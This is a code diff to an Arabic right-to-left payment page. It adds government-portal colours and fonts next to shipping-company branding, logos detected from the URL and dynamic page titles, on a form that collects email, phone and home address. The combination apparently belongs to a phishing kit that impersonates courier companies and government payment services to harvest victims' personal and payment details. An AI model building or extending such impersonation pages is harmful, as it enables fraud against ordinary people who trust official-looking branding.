@@ -17,6 +17,8 @@ import { designSystem } from "@/lib/designSystem";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 
 const PaymentRecipient = () => {
   const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
@@ -57,6 +59,10 @@ const PaymentRecipient = () => {
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const companyMeta = getCompanyMeta(serviceKey);
+  
+  // Check if this is a government service and get its theme
+  const isGovService = isGovernmentService(serviceKey);
+  const govSystem = getGovernmentPaymentSystem(countryCode);
 
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
@@ -102,8 +108,11 @@ const PaymentRecipient = () => {
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
   const displayLogo = entityLogo || branding.logo;
   
-  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
+  // Use government theme if it's a government service, otherwise use company branding
+  const primaryColor = isGovService ? govSystem.colors.primary : (companyBranding?.colors.primary || branding.colors.primary);
+  const secondaryColor = isGovService ? govSystem.colors.secondary : (companyBranding?.colors.secondary || branding.colors.secondary);
+  const surfaceColor = isGovService ? govSystem.colors.surface : (companyBranding?.colors.surface || '#F8F9FA');
+  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -248,8 +257,8 @@ const PaymentRecipient = () => {
         className="min-h-screen py-8 sm:py-12"
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
-          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
+          fontFamily: fontFamily
         }}
       >
         <div className="container mx-auto px-4 max-w-2xl">
@@ -385,7 +394,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: fontFamily
                     }}
                     placeholder="example@email.com"
                     dir="ltr"
@@ -420,7 +429,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: fontFamily
                     }}
                     placeholder={`${phoneCode} ${phonePlaceholder}`}
                     dir="ltr"
@@ -454,7 +463,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: fontFamily
                     }}
                     placeholder="أدخل عنوانك السكني الكامل"
                   />
